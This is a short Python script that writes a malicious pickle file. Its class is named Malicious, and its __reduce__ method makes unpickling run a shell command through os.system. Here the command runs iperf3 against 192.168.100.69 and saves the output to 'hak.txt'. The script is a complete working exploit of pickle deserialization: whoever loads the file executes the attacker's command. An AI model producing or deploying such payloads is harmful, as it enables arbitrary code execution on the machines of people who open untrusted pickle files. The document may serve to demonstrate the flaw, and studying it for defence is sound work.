import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('iperf3 -c 192.168.100.69 > hak.txt',))

with open("malicious.pkl", "wb") as f:
    pickle.dump(Malicious(), f)